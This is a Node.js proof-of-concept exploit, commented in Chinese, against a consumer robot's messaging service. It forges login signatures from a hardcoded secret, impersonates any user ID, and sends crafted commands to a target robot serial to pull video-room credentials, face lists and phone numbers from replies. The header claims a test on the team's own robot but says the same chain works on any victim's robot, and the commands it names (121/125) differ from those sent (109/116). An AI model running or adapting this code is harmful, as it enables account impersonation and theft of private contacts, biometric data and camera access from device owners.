// im_pii_test.js — 自有机器人 PII 出口实测：cmd 121 通讯录(含手机号) / cmd 125 通话记录
// 边界：仅打本团队自有机器人；证明的是"同一链路在任意受害者机器人上可导出通讯录手机号"。
// 用法: node im_pii_test.js <fromUserId> <robotSN>
require('./shim');
const TIM = require('tim-js-sdk');
const https = require('https');
const crypto = require('crypto');

const SDKAPPID = 1400032988;

function mintUserSig(userId) {
  return new Promise((resolve, reject) => {
    const t = Date.now().toString();
    const sig = crypto.createHash('md5').update('IM$SeCrET' + t).digest('hex');
    const qs = `signature=${sig}&time=${t}&userId=${encodeURIComponent(userId)}&channel=MINIEDUCN`;
    https.get(`https://apis.ubtrobot.com/im/getInfo?${qs}`, res => {
      let b = ''; res.on('data', d => b += d);
      res.on('end', () => { try {
        const j = JSON.parse(b);
        if (j.returnCode === '0' && j.returnMap && j.returnMap.userSig) resolve(j.returnMap.userSig);
        else reject(new Error('getInfo failed: ' + b.slice(0, 200)));
      } catch (e) { reject(e); } });
    }).on('error', reject);
  });
}
const sleep = ms => new Promise(r => setTimeout(r, ms));

function buildMsg(cmd, serial, bodyFields) {
  const header = [0x08, cmd, 0x10, 1, 0x18, serial];
  const body = bodyFields || [];
  const msg = [0x0a, header.length, ...header, 0x12, body.length, ...body];
  if (msg.some(b => b > 0x7f)) throw new Error('non-ASCII byte');
  return String.fromCharCode(...msg);
}
// 提取回包中的数字串（手机号）与可读字段
function extract(raw) {
  const phones = raw.match(/1[0-9]{10}/g) || [];
  const digitRuns = raw.match(/[0-9]{5,}/g) || [];
  const ascii = (raw.match(/[\x20-\x7e]{3,}/g) || []).join(' | ');
  return { phones, digitRuns, ascii };
}

(async () => {
  const [fromId, robotId] = [process.argv[2], process.argv[3]];
  if (!fromId || !robotId) { console.error('usage: node im_pii_test.js <from> <robotSN>'); process.exit(1); }

  const tim = TIM.create({ SDKAppID: SDKAPPID });
  tim.setLogLevel(0);
  let readyResolve; const ready = new Promise(r => readyResolve = r);
  tim.on(TIM.EVENT.SDK_READY, () => readyResolve());
  tim.on(TIM.EVENT.MESSAGE_RECEIVED, e => {
    e.data.forEach(m => {
      const raw = (m.payload && m.payload.data) || '';
      const x = extract(raw);
      console.log('[!!!] 回包 from=', m.from);
      console.log('      手机号形态:', x.phones.length ? x.phones : '(无)');
      console.log('      数字串:', x.digitRuns.slice(0, 8));
      console.log('      可读片段:', x.ascii.slice(0, 200));
    });
  });

  const userSig = await mintUserSig(fromId);
  await tim.login({ userID: <账户_01>, userSig });
  console.log('[+] 已登录为', fromId);
  await Promise.race([ready, sleep(10000)]);

  const steps = [
    ['cmd109 取视频房间凭据', buildMsg(109, 91, [0x08, 1])],
    ['cmd116 人脸列表', buildMsg(116, 92, [0x08, 1, 0x10, 20])],
  ];
  for (const [label, data] of steps) {
    const msg = tim.createCustomMessage({ to: robotId, conversationType: TIM.TYPES.CONV_C2C,
      payload: { data, description: '', extension: '' } });
    try {
      const r = await tim.sendMessage(msg);
      console.log('[+] 已投递:', label, 'status=', r.data.message.status);
    } catch (e) { console.log('[-] 投递失败:', label, e.code, e.message); }
    await sleep(7000);
  }
  await sleep(8000);
  try { await tim.logout(); } catch (e) {}
  process.exit(0);
})().catch(e => { console.error('[-] 失败:', e.code || '', e.message); process.exit(2); });
